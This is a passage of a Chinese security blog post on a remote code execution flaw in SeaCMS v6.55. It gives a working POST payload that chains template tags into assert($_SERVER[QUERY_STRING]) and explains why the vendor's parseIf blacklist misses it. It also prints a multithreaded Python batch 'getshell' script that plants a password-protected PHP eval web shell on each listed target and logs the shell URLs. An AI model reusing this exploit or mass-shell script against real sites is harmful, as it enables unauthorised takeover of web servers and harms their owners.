                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
                    <span class="k">if</span> <span class="ow">not</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">:</span>
                        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">exploit</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(),))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>



<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div><h1 id="v655漏洞详情">v6.55漏洞详情</h1>
<h2 id="漏洞代码执行-1">漏洞代码执行</h2>
<h3 id="payload-1">Payload</h3>
<p><strong>GET:</strong><code>http://seacms.test/search.php</code>
<strong>POST:</strong> <code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:as{searchpage:area}}&amp;area=s{searchpage:letter}&amp;letter=ert{searchpage:lang}&amp;yuyan=($_SE{searchpage:jq}&amp;jq=RVER{searchpage:ver}&amp;&amp;ver=[QUERY_STRING]));/*</code></p>
<h3 id="执行结果-1">执行结果</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_8.png" alt=""></p>
<h2 id="分析过程-1">分析过程</h2>
<ul>
<li>这次官方给出的修复是在<code>parseIf</code>函数里面加了黑名单。但是没有做SERVER变量的过滤，所以可以用SERVER变量的性质来达到写入命令。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"> <span class="k">function</span> <span class="nf">parseIf</span><span class="p">(</span><span class="nv">$content</span><span class="p">){</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;{if:&#39;</span><span class="p">)</span><span class="o">===</span> <span class="k">false</span><span class="p">){</span>
            <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$labelRule</span> <span class="o">=</span> <span class="nx">buildregx</span><span class="p">(</span><span class="s2">&#34;{if:(.*?)}(.*?){end if}&#34;</span><span class="p">,</span><span class="s2">&#34;is&#34;</span><span class="p">);</span>
            <span class="nv">$labelRule2</span><span class="o">=</span><span class="s2">&#34;{elseif&#34;</span><span class="p">;</span>
            <span class="nv">$labelRule3</span><span class="o">=</span><span class="s2">&#34;{else}&#34;</span><span class="p">;</span>
            <span class="nx">preg_match_all</span><span class="p">(</span><span class="nv">$labelRule</span><span class="p">,</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$iar</span><span class="p">);</span>
 <span class="k">foreach</span><span class="p">(</span><span class="nv">$iar</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">){</span>
        <span class="nv">$iarok</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;unlink&#39;</span><span class="p">,</span><span class="s1">&#39;opendir&#39;</span><span class="p">,</span><span class="s1">&#39;mysqli_&#39;</span><span class="p">,</span><span class="s1">&#39;mysql_&#39;</span><span class="p">,</span><span class="s1">&#39;socket_&#39;</span><span class="p">,</span><span class="s1">&#39;curl_&#39;</span><span class="p">,</span><span class="s1">&#39;base64_&#39;</span><span class="p">,</span><span class="s1">&#39;putenv&#39;</span><span class="p">,</span><span class="s1">&#39;popen(&#39;</span><span class="p">,</span><span class="s1">&#39;phpinfo&#39;</span><span class="p">,</span><span class="s1">&#39;pfsockopen&#39;</span><span class="p">,</span><span class="s1">&#39;proc_&#39;</span><span class="p">,</span><span class="s1">&#39;preg_&#39;</span><span class="p">,</span><span class="s1">&#39;_GET&#39;</span><span class="p">,</span><span class="s1">&#39;_POST&#39;</span><span class="p">,</span><span class="s1">&#39;_COOKIE&#39;</span><span class="p">,</span><span class="s1">&#39;_REQUEST&#39;</span><span class="p">,</span><span class="s1">&#39;_SESSION&#39;</span><span class="p">,</span><span class="s1">&#39;eval(&#39;</span><span class="p">,</span><span class="s1">&#39;file_&#39;</span><span class="p">,</span><span class="s1">&#39;passthru(&#39;</span><span class="p">,</span><span class="s1">&#39;exec(&#39;</span><span class="p">,</span><span class="s1">&#39;system(&#39;</span><span class="p">,</span><span class="s1">&#39;shell_&#39;</span><span class="p">),</span> <span class="s1">&#39;@.@&#39;</span><span class="p">,</span> <span class="nv">$v</span><span class="p">);</span>
</code></pre></div><h3 id="构造poc-1">构造POC</h3>
<blockquote>
<p>还是利用目标的多重替换，详细步骤见SeaCMS6.54。导致最后写入assert($_SERVER[QUERY_STRING])，因为$SERVER变量默认是不检查数据的安全性的，因而当我们把命令加在url后，$_SERVER[QUERY_STRING]便可以获得我们发送的请求也就是这里传递的要执行的命令。(search.php?whami)这样就执行了assert(whoami)</p>
</blockquote>
<ul>
<li>关于$_SERVER可以看官方文档：http://php.net/manual/zh/reserved.variables.server.php</li>
</ul>
<p><strong>POC：</strong><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:as{searchpage:area}}&amp;area=s{searchpage:letter}&amp;letter=ert{searchpage:lang}&amp;yuyan=($_SE{searchpage:jq}&amp;jq=RVER{searchpage:ver}&amp;ver=[QUERY_STRING]));/*</code></p>
<h2 id="用python编写批量getshell脚本-1">用Python编写批量Getshell脚本</h2>
<p>和上面差不多：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_9.png" alt=""></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="s1">&#39;&#39;&#39;
</span><span class="s1">author:F0rmat
</span><span class="s1">&#39;&#39;&#39;</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span> <span class="s2">&#34;-f&#34;</span><span class="p">:</span>
        <span class="n">target</span><span class="o">=</span><span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="o">+</span><span class="s2">&#34;/search.php?eval(join($_POST[9]))&#34;</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;fwrite(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat&#39;);&#34;</span>
    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
        <span class="s2">&#34;searchtype&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span>
        <span class="s2">&#34;9[]&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
        <span class="s2">&#34;searchword&#34;</span><span class="p">:</span> <span class="s2">&#34;{if{searchpage:year}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;year&#34;</span><span class="p">:</span> <span class="s2">&#34;:as{searchpage:area}}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;area&#34;</span><span class="p">:</span> <span class="s2">&#34;s{searchpage:letter}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;letter&#34;</span><span class="p">:</span> <span class="s2">&#34;ert{searchpage:lang}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;yuyan&#34;</span><span class="p">:</span> <span class="s2">&#34;($_SE{searchpage:jq}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;jq&#34;</span><span class="p">:</span> <span class="s2">&#34;RVER{searchpage:ver}&#34;</span><span class="p">,</span>
        <span class="s2">&#34;ver&#34;</span><span class="p">:</span> <span class="s2">&#34;[QUERY_STRING]));/*&#34;</span><span class="p">,</span>

    <span class="p">}</span>

    <span class="n">shell</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="s1">&#39;/shell.php&#39;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="n">verify</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
        <span class="k">if</span> <span class="s2">&#34;f0rmat&#34;</span> <span class="ow">in</span> <span class="n">verify</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
            <span class="k">print</span> <span class="s1">&#39;Write success,shell url:&#39;</span><span class="p">,</span><span class="n">shell</span><span class="p">,</span><span class="s1">&#39;pass:f0rmat&#39;</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;success.txt&#34;</span><span class="p">,</span><span class="s2">&#34;a+&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shell</span><span class="o">+</span><span class="s1">&#39;  pass:f0rmat&#39;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="n">target</span><span class="p">,</span><span class="s1">&#39;Write failure!&#39;</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">e</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">3</span><span class="p">:</span>
        <span class="k">print</span> <span class="s1">&#39;python check_order.py.py -h target/-f target-file&#39;</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;-h&#34;</span><span class="p">:</span>
            <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
        <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;-f&#34;</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">b</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
                    <span class="k">if</span> <span class="ow">not</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">:</span>
                        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">exploit</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(),))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>



<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div><h1 id="结束">结束</h1>
<p>昨天这个漏洞审计完没有写文章，因为感冒了，所以就早早睡觉了，在这变化多端的天气，表哥们也要注意身体哦。</p>
<h1 id="参考">参考</h1>
<p>源码我找不到6.54和55的了，不过这些方法在低版本的程序里面也能执行成功的。
所以这里找了一份6.53的：https://pan.lanzou.com/i0l9dsb</p>
<p>python脚本：https://github.com/F0r3at/Python-Tools/tree/master/seacms</p>
<p>漏洞参考文章：https://cloud.tencent.com/developer/article/1038216</p>
<p>PHP官方文档：http://php.net/docs.php</p>

    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    <li>上一篇：
        <a href="https://getshe11.com/post/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/">
            SeaCMS V6.45前台Getshell 代码执行漏洞(每日一洞)
        </a>
    </li>
    
    
    <li>下一篇：
        <a href="https://getshe11.com/post/zzcms-any-user-password-changes-loopholes-code-points/">
            ZZCMS8.2任意用户密码修改漏洞代码分析(每日一洞)
        </a>
    </li>
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>